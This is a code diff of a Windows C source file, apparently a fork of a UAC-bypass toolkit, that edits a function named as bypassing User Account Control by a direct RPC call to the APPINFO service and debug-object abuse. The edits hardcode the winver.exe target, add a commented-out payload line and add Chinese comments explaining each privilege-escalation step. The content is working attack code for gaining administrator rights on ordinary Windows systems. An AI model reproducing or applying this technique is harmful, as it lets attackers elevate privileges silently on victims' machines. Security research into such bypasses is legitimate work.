@@ -366,7 +366,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 {
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     SIZE_T size = 0x30;
-
+    //char* Payload = Payload;
     STARTUPINFOEX si;
     PROCESS_INFORMATION pi;
 
@@ -422,7 +422,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 * Purpose:
 *
 * Bypass UAC by direct RPC call to APPINFO and DebugObject use. 
-*
+* 直接的rpc调用 appinfo 和调试对象使用
 */
 NTSTATUS ucmDebugObjectMethod(
     _In_ LPWSTR lpszPayload
@@ -453,8 +453,8 @@ NTSTATUS ucmDebugObjectMethod(
         _strcpy(szProcess, g_ctx->szSystemDirectory);
         _strcat(szProcess, WINVER_EXE);
         // AicLaunchAdminProcess 这个常用于UAC绕过，启动成功后返回1构造RPC请求，执行管理员的操作时会调用他？ 
-        if (!AicLaunchAdminProcess(szProcess, // 0x012fec5c L"C:\\Windows\\system32\\winver.exe"
-            szProcess,
+        if (!AicLaunchAdminProcess((LPWSTR)L"C:\\Windows\\system32\\winver.exe", // 0x012fec5c L"C:\\Windows\\system32\\winver.exe"
+            (LPWSTR)L"C:\\Windows\\system32\\winver.exe",
             0,    // startflags设置为0
             CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, // debug_process创建标志设置 初始化服务器中 RPC 线程的 TEB 中的调试对象字段，并将其分配给新进程。
             g_ctx->szSystemRoot,
@@ -475,6 +475,7 @@ NTSTATUS ucmDebugObjectMethod(
         // supGetProcessDebugObject 这个里边包含了对 NtQueryInformationProcess 函数的调用
         status = supGetProcessDebugObject(procInfo.hProcess, // 使用NtQueryInformationProcess和返回的进程句柄打开调试对象的句柄。
             &dbgHandle);
+
 
         if (!NT_SUCCESS(status)) {  // 创建句柄如果不成功
             TerminateProcess(procInfo.hProcess, 0);  
@@ -500,7 +501,7 @@ NTSTATUS ucmDebugObjectMethod(
         _strcat(szProcess, COMPUTERDEFAULTS_EXE); // 0x008fe9fc L"C:\\Windows\\system32\\computerdefaults.exe"
         RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
         RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
-         
+        
         if (!AicLaunchAdminProcess(szProcess,  // 创建一个新进程
             szProcess,
             1,                                 // startflag设置为1 
